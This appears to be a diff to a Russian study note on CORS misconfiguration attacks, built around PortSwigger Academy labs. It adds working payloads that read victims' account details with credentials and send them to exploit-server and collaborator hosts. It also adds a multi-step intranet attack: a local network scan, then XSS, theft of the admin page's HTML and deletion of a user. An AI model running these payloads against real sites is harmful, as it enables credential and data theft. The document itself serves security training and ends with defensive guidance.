@@ -31,8 +31,8 @@ SOP обычно контролирует доступ, который код Ja
 Существуют различные исключения из SOP:
 - Некоторые объекты доступны для записи, но не доступны для чтения в разных доменах, например, объект `location` или свойство `location.href` из iframe или новых окон
 - Некоторые объекты доступны для чтения, но не доступны для записи, например, свойство `length` объекта `window` (которое хранит количество кадров, используемых на странице) и свойство `closed`
-- Функция `replace`, как правило, может быть вызвана кросс-доменным способом на объекте `location`
-- Некоторые функции можно вызывать кросс-доменным способом. Например, вы можете вызвать функции `close`, `blur` и `focus` в новом окне. Функция `postMessage` также может быть вызвана на iframe и новых окнах для отправки сообщений из одного домена в другой
+- Функция `replace`, как правило, может быть вызвана cross-origin способом на объекте `location`
+- Некоторые функции можно вызывать cross-origin способом. Например, вы можете вызвать функции `close`, `blur` и `focus` в новом окне. Функция `postMessage` также может быть вызвана на iframe и новых окнах для отправки сообщений из одного домена в другой
 
 В силу легаси требований, SOP является более мягкой при работе с файлами cookie, поэтому они часто доступны со всех поддоменов сайта, даже если каждый поддомен технически имеет другое происхождение. Вы можете частично снизить этот риск, используя флаг cookie `HttpOnly`
 
@@ -40,11 +40,11 @@ SOP обычно контролирует доступ, который код Ja
 
 ## Ослабление SOP
 
-SOP является очень строгой, поэтому были разработаны различные подходы для обхода ограничений. Многие веб-сайты взаимодействуют с поддоменами или сторонними сайтами таким образом, что требуется полный кросс-оригинальный доступ. Контролируемое ослабление политики одноименного доступа возможно с помощью CORS
+SOP является очень строгой, поэтому были разработаны различные подходы для обхода ограничений. Многие веб-сайты взаимодействуют с поддоменами или сторонними сайтами таким образом, что требуется полный cross-origin доступ. Контролируемое ослабление политики одноименного доступа возможно с помощью CORS
 
 Протокол CORS использует набор HTTP-заголовков, которые определяют доверенные веб-источники и связанные с ними свойства, например, разрешен ли аутентифицированный доступ. Они объединяются в заголовках, обменивающихся между браузером и веб-сайтом с перекрестным происхождением, к которому он пытается получить доступ
 
-Спецификация CORS обеспечивает контролируемое ослабление политики одинакового происхождения для HTTP-запросов к одному домену веб-сайта от другого с помощью набора HTTP-заголовков. Браузеры разрешают доступ к ответам на кросс-оригинальные запросы на основе инструкций этих заголовков
+Спецификация CORS обеспечивает контролируемое ослабление политики одинакового происхождения для HTTP-запросов к одному домену веб-сайта от другого с помощью набора HTTP-заголовков. Браузеры разрешают доступ к ответам на междоменные запросы на основе инструкций этих заголовков
 
 ### Access-Control-Allow-Origin response header
 
@@ -75,7 +75,7 @@ Access-Control-Allow-Origin: https://normal-website.com
 
 ### Обработка междоменных запросов ресурсов с кредами
 
-По умолчанию при междоменных запросах ресурсов запросы передаются без учетных данных, таких как cookies и заголовок `Authorization`. Однако кросс-доменный сервер может разрешить чтение ответа, если ему переданы учетные данные, установив заголовок CORS` Access-Control-Allow-Credentials` в `true`. Теперь, если запрашивающий сайт использует JavaScript, чтобы объявить, что он отправляет cookies вместе с запросом:
+По умолчанию при междоменных запросах ресурсов запросы передаются без учетных данных, таких как cookies и заголовок `Authorization`. Однако cross-origin сервер может разрешить чтение ответа, если ему переданы учетные данные, установив заголовок CORS` Access-Control-Allow-Credentials` в `true`. Теперь, если запрашивающий сайт использует JavaScript, чтобы объявить, что он отправляет cookies вместе с запросом:
 
 ```http
 GET /data HTTP/1.1
@@ -183,9 +183,9 @@ Access-Control-Allow-Credentials: true
 ...
 ```
 
-В этих заголовках указано, что доступ разрешен из запрашивающего домена (`malicious-website.com`) и что кросс-оригинальные запросы могут включать куки (`Access-Control-Allow-Credentials: true`) и поэтому будут обрабатываться в сессии
+В этих заголовках указано, что доступ разрешен из запрашивающего домена (`malicious-website.com`) и что cross-origin запросы могут включать куки (`Access-Control-Allow-Credentials: true`) и поэтому будут обрабатываться в сессии
 
-Поскольку приложение отражает произвольное происхождение в заголовке `Access-Control-Allow-Origin`, это означает, что абсолютно любой домен может получить доступ к ресурсам уязвимого домена. Если ответ содержит какую-либо конфиденциальную информацию, например, ключ API или маркер CSRF, вы можете получить ее, разместив на своем сайте следующий сценарий:
+Поскольку приложение отражает произвольное происхождение в заголовке `Access-Control-Allow-Origin`, это означает, что абсолютно любой домен может получить доступ к ресурсам уязвимого домена. Если ответ содержит какую-либо конфиденциальную информацию, например, ключ API или CSRF-токен, вы можете получить ее, разместив на своем сайте следующий сценарий:
 
 ```js
 var req = new XMLHttpRequest();
@@ -195,8 +195,25 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-   location='//malicious-website.com/log?key='+this.responseText;
+   location='/malicious-website.com/log?key='+this.responseText;
 };
+```
+
+Lab:
+
+```html
+<--! on exploit server -->
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://0ae7005904c7d03fc1456867004f00ad.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='/log?key='+this.responseText;
+};
+</script>
 ```
 
 ### Ошибки при разборе заголовков Origin
@@ -248,12 +265,12 @@ normal-website.com.evil-user.net
 
 Спецификация заголовка Origin поддерживает значение `null`. Браузеры могут отправлять значение `null` в заголовке Origin в различных необычных ситуациях:
 
-- Кросс-оригинальные перенаправления
+- Cross-origin перенаправления
 - Запросы с сериализованными данными
 - Запросы с использованием протокола `file:`
-- Кросс-оригинальные запросы в песочнице
+- Cross-origin запросы в песочнице
 
-Некоторые приложения могут включить нулевое происхождение в белый список для поддержки локальной разработки приложения. Например, предположим, что приложение получает следующий кросс-оригинальный запрос:
+Некоторые приложения могут включить нулевое происхождение в белый список для поддержки локальной разработки приложения. Например, предположим, что приложение получает следующий cross-origin запрос:
 
 ```http
 GET /sensitive-victim-data HTTP/1.1
@@ -269,7 +286,7 @@ Access-Control-Allow-Origin: null
 Access-Control-Allow-Credentials: true
 ```
 
-В этой ситуации злоумышленник может использовать различные уловки для создания кросс-оригинального запроса, содержащего значение `null` в заголовке `Origin`. Это удовлетворит белый список, что приведет к междоменному доступу. Например, это можно сделать с помощью междоменного запроса iframe с песочницей, имеющего вид:
+В этой ситуации злоумышленник может использовать различные уловки для создания cross-origin запроса, содержащего значение `null` в заголовке `Origin`. Это удовлетворит белый список, что приведет к междоменному доступу. Например, это можно сделать с помощью междоменного запроса iframe с песочницей, имеющего вид:
 
 ```js
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
@@ -280,7 +297,24 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-location='malicious-website.com/log?key='+this.responseText;
+	location='malicious-website.com/log?key='+this.responseText;
+};
+</script>"></iframe>
+```
+
+Lab:
+
+```html
+<--! on exploit server -->
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://0ae7005904c7d03fc1456867004f00ad.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='https://exploit-0a78002e0477d01dc16967e90144004a.exploit-server.net//log?key='+encodeURIComponent(this.responseText);
 };
 </script>"></iframe>
 ```
@@ -316,8 +350,6 @@ https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
 
 Предположим, что приложение, строго использующее HTTPS, также вносит в белый список доверенный поддомен, использующий обычный HTTP. Например, когда приложение получает следующий запрос:
 
-Приложение отвечает следующим образом:
-
 ```http
 GET /api/requestApiKey HTTP/1.1
 Host: vulnerable-website.com
@@ -325,13 +357,15 @@ Origin: http://trusted-subdomain.vulnerable-website.com
 Cookie: sessionid=...
 ```
 
-В этой ситуации злоумышленник, имеющий возможность перехватывать трафик пользователя-жертвы, может использовать конфигурацию CORS для компрометации взаимодействия жертвы с приложением. Эта атака включает в себя следующие шаги:
+Приложение отвечает следующим образом:
 
 ```http
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
 Access-Control-Allow-Credentials: true
 ```
+
+В этой ситуации злоумышленник, имеющий возможность перехватывать трафик пользователя-жертвы, может использовать конфигурацию CORS для компрометации взаимодействия жертвы с приложением. Эта атака включает в себя следующие шаги:
 
 - Пользователь-жертва делает любой обычный HTTP-запрос
 - Злоумышленник вводит перенаправление на:
@@ -346,6 +380,25 @@ Access-Control-Allow-Credentials: true
 
 Эта атака эффективна, даже если на уязвимом сайте используется протокол HTTPS, нет конечной точки HTTP и все файлы cookie помечены как безопасные
 
+```html
+<script>
+document.location="http://stock.0a1600430362a793c76d2c60005d00d3.web-security-academy.net/?productId=4<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://0a1600430362a793c76d2c60005d00d3.web-security-academy.net/accountDetails',true); 
+req.withCredentials = true;
+req.send();
+function reqListener() {
+	location='https://exploit-0a6c00e8031ba769c7d22b6001460054.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
+</script>
+```
+
+```html
+<script>
+document.location="http://stock.0a1600430362a793c76d2c60005d00d3.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a1600430362a793c76d2c60005d00d3.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c00e8031ba769c7d22b6001460054.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
 ### Intranets и CORS без кредов
 
 Большинство CORS-атак опираются на наличие заголовка ответа:
@@ -356,7 +409,7 @@ Access-Control-Allow-Credentials: true
 
 Без этого заголовка браузер пользователя-жертвы откажется отправлять свои cookies, что означает, что злоумышленник получит доступ только к неаутентифицированному контенту, который он мог бы получить, зайдя непосредственно на целевой сайт.
 
-Однако существует одна распространенная ситуация, когда злоумышленник не может получить прямой доступ к веб-сайту: когда он является частью внутренней сети организации и расположен в пространстве частных IP-адресов. Внутренние веб-сайты часто имеют более низкие стандарты безопасности, чем внешние сайты, что позволяет злоумышленникам найти уязвимости и получить дальнейший доступ. Например, кросс-оригинальный запрос в частной сети может выглядеть следующим образом:
+Однако существует одна распространенная ситуация, когда злоумышленник не может получить прямой доступ к веб-сайту: когда он является частью внутренней сети организации и расположен в пространстве частных IP-адресов. Внутренние веб-сайты часто имеют более низкие стандарты безопасности, чем внешние сайты, что позволяет злоумышленникам найти уязвимости и получить дальнейший доступ. Например, cross-origin запрос в частной сети может выглядеть следующим образом:
 
 ```http
 GET /reader?url=doc1.pdf HTTP/1.1
@@ -373,21 +426,163 @@ Access-Control-Allow-Origin: *
 
 Сервер приложений доверяет запросам ресурсов любого происхождения без учетных данных. Если пользователи в частном пространстве IP-адресов выходят в публичный интернет, то атака на основе CORS может быть осуществлена с внешнего сайта, который использует браузер жертвы в качестве прокси для доступа к ресурсам интрасети
 
+#### Lab
+
+**Шаг 1**
+
+Сканим локальную сеть на наличие конечной точки
+
+```html
+<script>
+var q = [], collaboratorURL = 'http://znqatly393h7ax9ys71p7qaai1osci07.oastify.com';
+
+for(i=1;i<=255;i++) {
+	q.push(function(url) {
+		return function(wait) {
+			fetchUrl(url, wait);
+		}
+	}('http://192.168.0.'+i+':8080'));
+}
+
+for(i=1;i<=20;i++){
+	if(q.length)q.shift()(i*100);
+}
+
+function fetchUrl(url, wait) {
+	var controller = new AbortController(), signal = controller.signal;
+	fetch(url, {signal}).then(r => r.text().then(text => {
+		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
+	}))
+	.catch(e => {
+		if(q.length) {
+			q.shift()(wait);
+		}
+	});
+	setTimeout(x => {
+		controller.abort();
+		if(q.length) {
+			q.shift()(wait);
+		}
+	}, wait);
+}
+</script>
+```
+
+Logs:
+
+```
+GET /exploit/znqatly393h7ax9ys71p7qaai1osci07.oastify.com?ip=192.168.0.156:8080&code=%3C!DOCTYPE%20html%3E%0A%3Chtml
+```
+
+**Шаг 2**
+
+Теперь мы проверяем поле имени пользователя на наличие уязвимости XSS. Получаем взаимодействие Collaborator с `foundXSS=1` в URL
+
+```html
+<script>
+function xss(url, text, vector) {
+	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+	fetch(url).then(r => r.text().then(text => {
+		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+	}))
+}
+
+fetchUrl("http://192.168.0.156:8080", "http://cn3ntyyg9ghkaa9bsk1273anieo7cx0m.oastify.com");
+</script>
+```
+
+Collaborator:
+
+![sop_example](../../images/cors_xss_collaborator.png)
+
+**Шаг 3**
+
+Теперь получаем исходный код страницы администратора
+
+```html
+<script>
+function xss(url, text, vector) {
+	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+	fetch(url).then(r=>r.text().then(text=>
+	{
+		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+	}
+	))
+}
+
+fetchUrl("http://192.168.0.156:8080", "http://cn3ntyyg9ghkaa9bsk1273anieo7cx0m.oastify.com");
+</script>
+```
+
+```html
+...
+        <div theme="">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href="/">Home</a><p>|</p>
+                            <a href="/admin">Admin panel</a><p>|</p>
+                            <a href="/my-account?id=administrator">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
+                        <input required="" type="hidden" name="csrf" value="sLoLq9p2CqfnZtvoklfpDQXnZkszZmGa">
+                        <label>Username</label>
+                        <input required="" type="text" name="username">
+                        <button class="button" type="submit">Delete user</button>
+                    </form>
+                </div>
+            </section>
+        </div>
+...
+```
+
+**Шаг 4**
+
+Удаляем `carlos`, внедряя iframe, указывающий на страницу `/admin`
+
+```html
+<script>
+function xss(url, text, vector) {
+	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+	fetch(url).then(r=>r.text().then(text=>
+	{
+	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+	}
+	))
+}
+
+fetchUrl("http://192.168.0.156:8080");
+</script>
+```
+
 ## Как предотвратить CORS-based атаки
 
 Уязвимости CORS возникают в основном из-за неправильной конфигурации. Поэтому предотвращение атак - это проблема конфигурации. В следующих разделах описаны некоторые эффективные средства защиты от CORS-атак
 
-### Правильная настройка кросс-оригинальных запросов
+### Правильная настройка cross-origin запросов
 
 Если веб-ресурс содержит конфиденциальную информацию, его происхождение должно быть правильно указано в заголовке `Access-Control-Allow-Origin`
 
 ### Разрешайте только доверенные сайты
 
-Это может показаться очевидным, но источники, указанные в заголовке `Access-Control-Allow-Origin`, должны быть только сайтами, которым доверяют. В частности, динамическое отражение происхождения из кросс-оригинальных запросов без проверки легко эксплуатируется и его следует избегать
+Это может показаться очевидным, но источники, указанные в заголовке `Access-Control-Allow-Origin`, должны быть только сайтами, которым доверяют. В частности, динамическое отражение происхождения из cross-origin запросов без проверки легко эксплуатируется и его следует избегать
 
 ### Избегайте вайтлистинг null
 
-Избегайте использования заголовка `Access-Control-Allow-Origin: null`. Кросс-оригинальные вызовы ресурсов из внутренних документов и запросы в песочнице могут указывать `null` происхождение. Заголовки CORS должны быть правильно определены в отношении доверенного происхождения для частных и публичных серверов
+Избегайте использования заголовка `Access-Control-Allow-Origin: null`. cross-origin вызовы ресурсов из внутренних документов и запросы в песочнице могут указывать `null` происхождение. Заголовки CORS должны быть правильно определены в отношении доверенного происхождения для частных и публичных серверов
 
 ### Избегайте использования wildcards во внутренних сетях
 
